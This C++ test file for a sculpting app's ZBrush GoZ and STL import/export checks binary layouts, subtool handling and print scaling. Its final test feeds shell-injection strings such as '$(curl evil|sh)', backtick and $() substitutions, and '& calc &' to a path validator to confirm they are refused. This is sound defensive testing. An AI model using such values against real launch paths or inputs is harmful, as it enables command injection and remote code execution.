// SculptForge - open source digital sculpting
// SPDX-License-Identifier: GPL-3.0-or-later
//
// ZBrush interoperability: GoZ read/write (checked against a buffer laid out
// exactly like GoB's writer), the GoZ bridge folder, and STL.
#include "TestHarness.h"

#include "core/Commands.h"
#include "core/Primitives.h"
#include "io/GozIO.h"
#include "io/StlIO.h"

#include <algorithm>
#include <cmath>
#include <cstring>
#include <filesystem>
#include <fstream>
#include <iterator>

using namespace sf;

namespace {

// Byte writer mirroring GoB's struct.pack calls (little-endian).
struct Bytes {
    std::vector<uint8_t> b;
    void u8(uint8_t v) { b.push_back(v); }
    void raw(const char* s, size_t n) { b.insert(b.end(), s, s + n); }
    void u16(uint16_t v) {
        u8(uint8_t(v & 0xff));
        u8(uint8_t(v >> 8));
    }
    void u32(uint32_t v) {
        for (int i = 0; i < 4; ++i) u8(uint8_t(v >> (8 * i)));
    }
    void u64(uint64_t v) {
        u32(uint32_t(v));
        u32(uint32_t(v >> 32));
    }
    void f32(float f) {
        uint32_t x;
        std::memcpy(&x, &f, 4);
        u32(x);
    }
    void tag(uint8_t a, uint8_t c) { u8(a), u8(c), u8(0), u8(0); }
};

// One quad (0,1,2,3) and one triangle (1,4,2) as GoB's exportGoZ writes them:
// header, object name, mesh name, vertices, faces, UVs, polypaint, mask,
// polygroups, 16 zero bytes. Coordinates are in ZBrush space.
std::vector<uint8_t> gobQuadAndTriangle() {
    const std::string name = "Quad";
    Bytes w;
    w.raw("GoZb 1.0 ZBrush GoZ Binary", 26);
    for (int i = 0; i < 6; ++i) w.u8(0x2e);
    w.u32(1);
    w.u32(uint32_t(name.size() + 24));
    w.u64(1);
    w.raw("GoZMesh_", 8);
    w.raw(name.data(), name.size());
    w.tag(0x89, 0x13);
    w.u32(20);
    w.u64(1);
    w.u32(0);
    // Vertices
    const float verts[5][3] = {{0, 0, 0}, {1, 0, 0}, {1, 1, 0}, {0, 1, 0}, {2, 0.5f, 0.25f}};
    w.tag(0x11, 0x27);
    w.u32(5 * 3 * 4 + 16);
    w.u64(5);
    for (auto& v : verts)
        for (float c : v) w.f32(c);
    // Faces
    w.tag(0x21, 0x4e);
    w.u32(2 * 4 * 4 + 16);
    w.u64(2);
    for (uint32_t i : {0u, 1u, 2u, 3u}) w.u32(i);
    for (uint32_t i : {1u, 4u, 2u, 0xffffffffu}) w.u32(i);
    // UVs: 4 corners per face, V flipped (GoB's default), triangles padded with (0, 1)
    w.tag(0xa9, 0x61);
    w.u32(2 * 4 * 2 * 4 + 16);
    w.u64(2);
    const float uvs[8][2] = {{0, 1}, {0.5f, 1}, {0.5f, 0.5f}, {0, 0.5f}, {0.5f, 1}, {1, 0.75f}, {0.5f, 0.5f}, {0, 1}};
    for (auto& uv : uvs) w.f32(uv[0]), w.f32(uv[1]);
    // Polypaint: count as uint32 + float 0, then B, G, R, 0 per vertex
    w.tag(0xb9, 0x88);
    w.u32(5 * 4 + 16);
    w.u32(5);
    w.f32(0.0f);
    const uint8_t rgb[5][3] = {{255, 0, 0}, {0, 255, 0}, {0, 0, 255}, {255, 255, 255}, {128, 64, 32}};
    for (auto& c : rgb) w.u8(c[2]), w.u8(c[1]), w.u8(c[0]), w.u8(0);
    // Mask: (1 - mask) * 65535
    w.tag(0x32, 0x75);
    w.u32(5 * 2 + 16);
    w.u64(5);
    for (uint16_t m : {uint16_t(65535), uint16_t(0), uint16_t(65535), uint16_t(65535), uint16_t(32768)}) w.u16(m);
    // Polygroups: uint16 per face
    w.tag(0x41, 0x9c);
    w.u32(2 * 2 + 16);
    w.u64(2);
    w.u16(7);
    w.u16(65504);
    for (int i = 0; i < 16; ++i) w.u8(0);
    return w.b;
}

void paintAll(Mesh& m) {
    m.ensureMask();
    m.ensureColors();
    for (uint32_t v = 0; v < m.vertexCount(); ++v) {
        const glm::vec3& p = m.positions[v];
        m.mask[v] = std::clamp(p.y * 0.5f + 0.5f, 0.0f, 1.0f);
        m.colors[v] = srgbToLinear(glm::vec3(p.x, p.y, p.z) * 0.5f + 0.5f);
    }
    m.ensurePolygroups();
    m.uvs.resize(m.triangleCount() * 3);
    for (uint32_t t = 0; t < m.triangleCount(); ++t) {
        m.polygroups[t] = t % 5 + (t % 2 ? 1000 : 0);
        for (int c = 0; c < 3; ++c) {
            const glm::vec3& p = m.positions[m.triangles[t][c]];
            m.uvs[t * 3 + size_t(c)] = glm::vec2(p.x, p.z) * 0.25f + 0.5f;
        }
    }
}

std::vector<uint8_t> readFile(const std::string& path) {
    std::ifstream f(path, std::ios::binary);
    return {std::istreambuf_iterator<char>(f), std::istreambuf_iterator<char>()};
}

float maxSrgbError(const Mesh& a, const Mesh& b) {
    float e = 0.0f;
    for (size_t v = 0; v < a.colors.size(); ++v) {
        glm::vec3 d = glm::abs(linearToSrgb(a.colors[v]) - linearToSrgb(b.colors[v]));
        e = std::max(e, std::max(d.x, std::max(d.y, d.z)));
    }
    return e;
}

} // namespace

TEST(goz_round_trip_keeps_everything) {
    Mesh m = makeIcosphere(3);
    paintAll(m);
    for (bool quads : {true, false}) {
        GozWriteOptions o;
        o.quads = quads;
        std::vector<uint8_t> bytes = writeGoz(m, "My Head!", o);
        Mesh r;
        GozInfo info;
        std::string err;
        CHECK(parseGoz(bytes, r, err, &info));
        CHECK(err.empty());
        CHECK(info.name == "My_Head");
        CHECK(r.positions == m.positions);
        CHECK(r.triangles == m.triangles);
        CHECK(r.polygroups == m.polygroups);
        CHECK(r.uvs.size() == m.uvs.size());
        float uvErr = 0.0f, maskErr = 0.0f;
        for (size_t i = 0; i < m.uvs.size() && i < r.uvs.size(); ++i)
            uvErr = std::max(uvErr, glm::length(r.uvs[i] - m.uvs[i]));
        for (size_t v = 0; v < m.mask.size() && v < r.mask.size(); ++v) maskErr = std::max(maskErr, std::abs(r.mask[v] - m.mask[v]));
        CHECK(uvErr < 1e-6f);
        CHECK(r.mask.size() == m.mask.size() && maskErr < 1e-4f);
        CHECK(r.colors.size() == m.colors.size() && maxSrgbError(r, m) <= 0.5f / 255.0f + 1e-4f);
        CHECK(r.normals.size() == r.positions.size());
        if (!quads) CHECK(info.quads == 0 && info.triangles == m.triangleCount());
    }
    // Writing what was read gives the same bytes.
    std::vector<uint8_t> first = writeGoz(m, "Head");
    Mesh r;
    std::string err;
    CHECK(parseGoz(first, r, err));
    CHECK(writeGoz(r, "Head") == first);
}

TEST(goz_parses_gob_layout) {
    const std::vector<uint8_t> bytes = gobQuadAndTriangle();
    Mesh m;
    GozInfo info;
    std::string err;
    CHECK(parseGoz(bytes, m, err, &info));
    CHECK(info.name == "Quad" && info.quads == 1 && info.triangles == 1);
    CHECK(m.vertexCount() == 5);
    // Y-down ZBrush to Y-up: (x, y, z) -> (x, -y, -z).
    CHECK(m.positions[2] == glm::vec3(1, -1, 0) && m.positions[4] == glm::vec3(2, -0.5f, -0.25f));
    // The quad becomes (0,1,2) + (0,2,3), then the triangle.
    CHECK(m.triangleCount() == 3);
    CHECK(m.triangles[0] == glm::uvec3(0, 1, 2) && m.triangles[1] == glm::uvec3(0, 2, 3) && m.triangles[2] == glm::uvec3(1, 4, 2));
    CHECK(m.polygroups == std::vector<uint32_t>({7u, 7u, 65504u}));
    CHECK(m.uvs.size() == 9);
    CHECK(m.uvs.size() == 9 && m.uvs[0] == glm::vec2(0, 0) && m.uvs[1] == glm::vec2(0.5f, 0) && m.uvs[5] == glm::vec2(0, 0.5f) &&
          m.uvs[7] == glm::vec2(1, 0.25f));
    CHECK(m.mask.size() == 5 && m.mask[0] == 0.0f && m.mask[1] == 1.0f && std::abs(m.mask[4] - 0.5f) < 1e-4f);
    CHECK(m.colors.size() == 5);
    CHECK(m.colors.size() == 5 && m.colors[0] == glm::vec3(1, 0, 0) && m.colors[1] == glm::vec3(0, 1, 0) &&
          m.colors[2] == glm::vec3(0, 0, 1));
    CHECK(m.colors.size() == 5 && std::abs(linearToSrgb(m.colors[4]).x - 128.0f / 255.0f) < 1e-4f);
    // SculptForge writes the same layout back, byte for byte.
    CHECK(writeGoz(m, "Quad") == bytes);
}

TEST(goz_skips_unknown_sections_and_rejects_garbage) {
    std::vector<uint8_t> bytes = gobQuadAndTriangle();
    // Insert an unknown section (tag 0x1234, 8 payload bytes) before the vertices, and a subdivision record.
    const uint8_t vertexTag[4] = {0x11, 0x27, 0, 0};
    auto at = std::search(bytes.begin(), bytes.end(), vertexTag, vertexTag + 4);
    CHECK(at != bytes.end());
    const uint8_t extra[] = {0x34, 0x12, 0, 0, 16, 0, 0, 0, 1, 2, 3, 4, 5, 6, 7, 8,
                             0x8a, 0x13, 0, 0, 32, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
    bytes.insert(at, std::begin(extra), std::end(extra));
    Mesh m;
    GozInfo info;
    std::string err;
    CHECK(parseGoz(bytes, m, err, &info));
    CHECK(m.triangleCount() == 3 && info.subdivisionLevel == 2);

    const char junk[] = "solid not a goz file";
    CHECK(!parseGoz(std::span(reinterpret_cast<const uint8_t*>(junk), sizeof(junk)), m, err));
    std::vector<uint8_t> truncated(bytes.begin(), bytes.begin() + 60);
    CHECK(!parseGoz(truncated, m, err));
    // Out-of-range indices are dropped, not trusted.
    std::vector<uint8_t> bad = gobQuadAndTriangle();
    const uint8_t faceTag[4] = {0x21, 0x4e, 0, 0};
    auto f = std::search(bad.begin(), bad.end(), faceTag, faceTag + 4);
    f[16 + 16 + 4] = 99; // second face, second index
    CHECK(parseGoz(bad, m, err) && m.triangleCount() == 2 && !err.empty());
}

TEST(goz_commands_and_open) {
    CommandRegistry reg;
    for (const char* name : {"goz_import", "goz_export", "goz_send", "goz_receive", "export_stl"}) CHECK(reg.find(name));
    Mesh m = makeIcosphere(2);
    paintAll(m);
    Document doc = makeDoc(m);
    const std::string path = tempPath("sf_goz_cmd.GoZ");
    CHECK(reg.execute(doc, "goz_export", {{"path", path}}).ok);
    Document other;
    CommandResult r = reg.execute(other, "open", {{"path", path}});
    CHECK(r.ok);
    CHECK(other.mesh.triangles == m.triangles && other.mesh.polygroups == m.polygroups && other.gozName == "sf_goz_cmd");
    Document third;
    r = reg.execute(third, "goz_import", {{"path", path}});
    CHECK(r.ok && third.mesh.hasMask() && third.mesh.hasColors() && third.mesh.hasUvs() && third.gozName == "sf_goz_cmd");
    std::filesystem::remove(path);

    r = reg.execute(doc, "open", {{"path", "model.zpr"}});
    CHECK(!r.ok && r.message.find("proprietary") != std::string::npos && r.message.find("GoZ") != std::string::npos &&
          r.message.find("OBJ") != std::string::npos);
    // A .ztl without a conversion beside it points to the ZBrush plug-in.
    r = reg.execute(doc, "open", {{"path", "model.ZTL"}});
    CHECK(!r.ok && r.message.find("proprietary") != std::string::npos && r.message.find("ZTL Export") != std::string::npos);
}

// The SculptForge ZTL Export plug-in writes <name>.sf<NNN>_<SubTool>.GoZ next to <name>.ztl; opening the .ztl
// opens every SubTool in order. A folder of numbered .GoZ files opens the same way.
TEST(goz_converted_ztool_opens_as_subtools) {
    namespace fs = std::filesystem;
    const fs::path base = fs::path(tempPath("sf_ztool_test"));
    fs::remove_all(base);
    fs::create_directories(base / "Dragon.sculptforge");
    Mesh body = makeIcosphere(2);
    paintAll(body);
    Mesh horn = makeIcosphere(1);
    std::string err;
    // Written out of order on purpose: the number, not the directory order, sets the SubTool order.
    for (const fs::path dir : {base, base / "Dragon.sculptforge"}) {
        const std::string prefix = dir == base ? "Dragon.sf" : "";
        CHECK(saveGoz((dir / (prefix + "002_Horn.GoZ")).string(), horn, "Horn", err));
        CHECK(saveGoz((dir / (prefix + "001_Body.GoZ")).string(), body, "Body", err));
    }
    CHECK(saveGoz((base / "Other.sf001_Rock.GoZ").string(), horn, "Rock", err)); // another ZTool's file
    { std::ofstream((base / "Dragon.sculptforge" / "notes.txt").string()) << "not a mesh"; }
    { std::ofstream((base / "Dragon.ztl").string(), std::ios::binary) << "ZTL"; }

    CHECK(convertedZToolFiles((base / "Dragon.ztl").string()).size() == 2);
    CHECK(convertedZToolFiles((base / "Missing.ztl").string()).empty());
    CHECK(convertedZToolFiles((base / "Dragon.obj").string()).empty());

    CommandRegistry reg;
    for (const std::string path : {(base / "Dragon.ztl").string(), (base / "Dragon.sculptforge").string()}) {
        Document doc;
        CommandResult r = reg.execute(doc, "open", {{"path", path}});
        CHECK(r.ok && r.message.find("2 Parts") != std::string::npos);
        CHECK(doc.subtoolCount() == 2);
        if (doc.subtoolCount() != 2) continue;
        CHECK(doc.subtools[0].name == "Body" && doc.subtools[1].name == "Horn");
        CHECK(doc.subtoolMesh(0).triangleCount() == body.triangleCount() && doc.subtoolMesh(0).hasColors() &&
              doc.subtoolMesh(0).hasMask() && doc.subtoolMesh(0).hasUvs());
        CHECK(doc.subtoolMesh(1).triangleCount() == horn.triangleCount());
    }

    // Without a conversion, a .ztl explains the plug-in; an empty folder is an error, not an empty scene.
    Document doc;
    CommandResult r = reg.execute(doc, "open", {{"path", (base / "Missing.ztl").string()}});
    CHECK(!r.ok && r.message.find("ZTL Export") != std::string::npos);
    fs::create_directories(base / "Empty.sculptforge");
    CHECK(!reg.execute(doc, "open", {{"path", (base / "Empty.sculptforge").string()}}).ok);
    fs::remove_all(base);
}

TEST(goz_bridge_send_and_receive) {
    namespace fs = std::filesystem;
    const fs::path root = fs::temp_directory_path() / "sf_goz_bridge";
    fs::remove_all(root);
    CommandRegistry reg;
    Mesh m = makeIcosphere(2);
    paintAll(m);
    Document doc = makeDoc(m);
    const std::string folder = root.string();
    CommandResult r = reg.execute(doc, "goz_send", {{"folder", folder}, {"name", "Sphere 1"}, {"launch", false}});
    CHECK(r.ok);
    const fs::path project = root / "GoZProjects" / "Default";
    CHECK(fs::exists(project / "Sphere_1.GoZ") && fs::exists(project / "Sphere_1.ztn"));
    CHECK(fs::exists(root / "GoZBrush" / "GoZ_Application.txt") && fs::exists(root / "GoZApps" / "SculptForge" / "GoZ_Info.txt"));
    std::vector<uint8_t> list = readFile((root / "GoZBrush" / "GoZ_ObjectList.txt").string());
    const std::string expected = (project / "Sphere_1").generic_string() + "\n";
    CHECK(std::string(list.begin(), list.end()) == expected);
    CHECK(doc.gozName == "Sphere_1");

    // ZBrush sends two SubTools back: the first replaces the fresh scene (undoably), the second is added.
    Mesh second = makeIcosphere(1);
    for (auto& p : second.positions) p += glm::vec3(3, 0, 0);
    std::string err;
    CHECK(saveGoz((project / "Other.GoZ").string(), second, "Other", err));
    {
        std::ofstream f(root / "GoZBrush" / "GoZ_ObjectList.txt", std::ios::binary);
        f << (project / "Sphere_1").generic_string() << "\r\n" << (project / "Other").generic_string() << "\r\n";
    }
    Document back = makeDoc(makeIcosphere(0));
    r = reg.execute(back, "goz_receive", {{"folder", folder}});
    CHECK(r.ok && r.message.find("Sphere_1") != std::string::npos);
    CHECK(back.subtoolCount() == 2 && back.activeSubtool == 0);
    CHECK(back.subtools[0].name == "Sphere_1" && back.gozName == "Sphere_1");
    CHECK(back.subtools[1].name == "Other" && back.subtools[1].gozName == "Other");
    CHECK(back.mesh.vertexCount() == m.vertexCount() && back.mesh.triangleCount() == m.triangleCount());
    CHECK(back.subtoolMesh(1).triangleCount() == second.triangleCount());
    CHECK(back.mesh.mask.size() == back.mesh.vertexCount() && back.mesh.polygroups.size() == back.mesh.triangleCount());
    CHECK(back.mesh.uvs.size() == back.mesh.triangleCount() * 3);
    CHECK(back.undo.canUndo());
    // Receiving again updates the same SubTools (matched by GoZ name) instead of adding more.
    r = reg.execute(back, "goz_receive", {{"folder", folder}});
    CHECK(r.ok && back.subtoolCount() == 2 && back.activeSubtool == 0);
    back.selectSubtool(1);
    CHECK(back.undo.canUndo() && back.mesh.triangleCount() == second.triangleCount());
    back.selectSubtool(0);
    // Sending both back writes one .GoZ per SubTool, listed in order.
    r = reg.execute(back, "goz_send", {{"folder", folder}, {"launch", false}});
    CHECK(r.ok);
    list = readFile((root / "GoZBrush" / "GoZ_ObjectList.txt").string());
    CHECK(std::string(list.begin(), list.end()) ==
          (project / "Sphere_1").generic_string() + "\n" + (project / "Other").generic_string() + "\n");

    // Missing object list explains what to do.
    fs::remove(root / "GoZBrush" / "GoZ_ObjectList.txt");
    r = reg.execute(back, "goz_receive", {{"folder", folder}});
    CHECK(!r.ok && r.message.find("GoZ") != std::string::npos);
    fs::remove_all(root);
#if !defined(_WIN32) && !defined(__APPLE__)
    CHECK(gozDefaultRoot().empty());
    r = reg.execute(doc, "goz_send", {{"launch", false}});
    CHECK(!r.ok && r.message.find("Windows and macOS") != std::string::npos);
#endif
}

TEST(stl_round_trip_and_ascii) {
    Mesh m = makeIcosphere(3);
    const std::string path = tempPath("sf_stl_test.stl");
    std::string err;
    CHECK(saveStl(path, m, err));
    CHECK(std::filesystem::file_size(path) == 84 + 50 * m.triangleCount());
    Mesh r;
    CHECK(loadStl(path, r, err));
    CHECK(r.vertexCount() == m.vertexCount() && r.triangleCount() == m.triangleCount());
    bool same = true;
    for (size_t t = 0; t < m.triangleCount() && t < r.triangleCount(); ++t)
        for (int c = 0; c < 3; ++c)
            same = same && glm::length(r.positions[r.triangles[t][c]] - m.positions[m.triangles[t][c]]) < 1e-6f;
    CHECK(same);

    // Commands: export_stl and open.
    CommandRegistry reg;
    Document doc = makeDoc(m);
    CHECK(reg.execute(doc, "export_stl", {{"path", path}}).ok);
    Document other;
    CHECK(reg.execute(other, "open", {{"path", path}}).ok && other.mesh.triangleCount() == m.triangleCount());
    std::filesystem::remove(path);

    const char ascii[] = "solid tet\n"
                         " facet normal 0 0 -1\n  outer loop\n   vertex 0 0 0\n   vertex 0 1 0\n   vertex 1 0 0\n  endloop\n endfacet\n"
                         " facet normal 0 -1 0\n  outer loop\n   vertex 0 0 0\n   vertex 1 0 0\n   vertex 0 0 1\n  endloop\n endfacet\n"
                         " facet normal -1 0 0\n  outer loop\n   vertex 0 0 0\n   vertex 0 0 1\n   vertex 0 1 0\n  endloop\n endfacet\n"
                         " facet normal 1 1 1\n  outer loop\n   vertex 1 0 0\n   vertex 0 1 0\n   vertex 0 0 1.5e0\n  endloop\n endfacet\n"
                         "endsolid tet\n";
    Mesh tet;
    CHECK(parseStl(std::span(reinterpret_cast<const uint8_t*>(ascii), sizeof(ascii) - 1), tet, err));
    CHECK(tet.vertexCount() == 5 && tet.triangleCount() == 4); // 0 0 1 and 0 0 1.5 differ
    const char notStl[] = "hello";
    CHECK(!parseStl(std::span(reinterpret_cast<const uint8_t*>(notStl), sizeof(notStl) - 1), tet, err));
}

TEST(stl_is_millimetres_z_up) {
    // A 2 m tall box (1 unit = 1 m, Y up) prints 2000 mm tall along Z, with its faces still pointing out.
    Mesh m = makeCube(2); // -1..1
    for (auto& p : m.positions) p = glm::vec3(p.x * 0.5f, p.y + 1.0f, p.z * 0.25f);
    const std::string path = tempPath("sf_stl_print.stl");
    std::string err;
    CHECK(saveStl(path, m, err));
    const std::vector<uint8_t> bytes = readFile(path);
    CHECK(std::string(reinterpret_cast<const char*>(bytes.data())).find("millimetres, Z up") != std::string::npos);
    auto fileBounds = [](const std::vector<uint8_t>& b, double* volume) {
        AABB box;
        uint32_t count;
        std::memcpy(&count, b.data() + 80, 4);
        *volume = 0;
        for (uint32_t t = 0; t < count; ++t) {
            glm::vec3 v[3];
            std::memcpy(v, b.data() + 84 + t * 50 + 12, 36);
            for (const auto& p : v) box.expand(p);
            *volume += glm::dot(v[0], glm::cross(v[1], v[2])) / 6.0;
        }
        return box;
    };
    double volume;
    AABB box = fileBounds(bytes, &volume);
    CHECK(std::abs(box.extent().z - 2000.0f) < 0.1f && std::abs(box.extent().x - 1000.0f) < 0.1f &&
          std::abs(box.extent().y - 500.0f) < 0.1f);
    CHECK(std::abs(box.min.z) < 0.1f); // the bottom stays on the bed
    CHECK(volume > 0);                // outward winding

    // Opening it gives back the sculpt-space mesh.
    Mesh r;
    CHECK(loadStl(path, r, err));
    CHECK(glm::length(r.bounds().min - m.bounds().min) < 1e-5f && glm::length(r.bounds().max - m.bounds().max) < 1e-5f);

    // height_mm scales to a print height; the status line gives the printed size.
    CommandRegistry reg;
    Document doc = makeDoc(m);
    CommandResult res = reg.execute(doc, "export_stl", {{"path", path}, {"height_mm", 80.0}});
    CHECK(res.ok && res.message.find("40.0 x 20.0 x 80.0 mm") != std::string::npos);
    box = fileBounds(readFile(path), &volume);
    CHECK(std::abs(box.extent().z - 80.0f) < 0.01f && volume > 0);
    // z_up=false and scale=1 write sculpt space as it is.
    CHECK(reg.execute(doc, "export_stl", {{"path", path}, {"scale", 1.0}, {"z_up", false}}).ok);
    box = fileBounds(readFile(path), &volume);
    CHECK(std::abs(box.extent().y - 2.0f) < 1e-4f);
    CHECK(!reg.execute(doc, "export_stl", {{"path", path}, {"scale", -1.0}}).ok);

    // Files from SculptForge 0.5 and earlier (metres, Y up) are recognised by their header and kept as stored.
    std::vector<uint8_t> legacy(84, 0);
    std::memcpy(legacy.data(), "SculptForge binary STL", 22);
    const uint32_t count = uint32_t(m.triangleCount());
    std::memcpy(legacy.data() + 80, &count, 4);
    for (const auto& t : m.triangles) {
        uint8_t tri[50] = {};
        for (int c = 0; c < 3; ++c) std::memcpy(tri + 12 + 12 * c, &m.positions[t[c]], 12);
        legacy.insert(legacy.end(), tri, tri + 50);
    }
    CHECK(parseStl(legacy, r, err));
    CHECK(r.bounds().min == m.bounds().min && r.bounds().max == m.bounds().max);
    std::filesystem::remove(path);
}

TEST(goz_large_polygroup_ids_stay_distinct) {
    // GoZ ids are 16-bit: ids past 65535 are renumbered, not truncated into other groups.
    Mesh m = makeIcosphere(2);
    m.ensurePolygroups();
    for (uint32_t t = 0; t < m.triangleCount(); ++t) m.polygroups[t] = t % 3 == 0 ? 1u : t % 3 == 1 ? 65536u : 65537u;
    Mesh r;
    std::string err;
    CHECK(parseGoz(writeGoz(m, "Groups", GozWriteOptions{false}), r, err));
    CHECK(r.polygroups.size() == m.polygroups.size());
    bool same = r.polygroups.size() == m.polygroups.size();
    for (size_t a = 0; same && a < m.polygroups.size(); ++a)
        for (size_t b : {size_t(0), size_t(1), size_t(2)})
            same = same && ((m.polygroups[a] == m.polygroups[b]) == (r.polygroups[a] == r.polygroups[b]));
    CHECK(same); // the same partition into groups
    std::vector<uint32_t> ids = r.polygroups;
    std::sort(ids.begin(), ids.end());
    CHECK(std::unique(ids.begin(), ids.end()) - ids.begin() == 3);
}

TEST(goz_send_refuses_shell_unsafe_launch_paths) {
    namespace fs = std::filesystem;
    CHECK(gozShellSafePath("/Applications/ZBrush 2024/ZBrush.app"));
    for (const char* bad : {"$(curl evil|sh)", "x\" & calc & \"", "`id`", "%COMSPEC%", "a\nb"}) CHECK(!gozShellSafePath(bad));
    const fs::path root = fs::temp_directory_path() / "sf_goz_unsafe";
    fs::remove_all(root);
    CommandRegistry reg;
    Document doc = makeDoc(makeIcosphere(1));
    CommandResult r = reg.execute(doc, "goz_send", {{"folder", root.string()}, {"zbrush", "$(curl evil|sh)"}});
    CHECK(!r.ok && !fs::exists(root / "GoZProjects")); // refused before anything is written or run
    r = reg.execute(doc, "goz_send", {{"folder", root.string()}, {"zbrush", (root / "calc").string()}});
    CHECK(!r.ok); // not a ZBrush
    r = reg.execute(doc, "goz_send", {{"folder", (root / "$(id)").string()}});
    CHECK(!r.ok);
    CHECK(reg.execute(doc, "goz_send", {{"folder", (root / "$(id)").string()}, {"launch", false}}).ok); // nothing launched
    fs::remove_all(root);
}
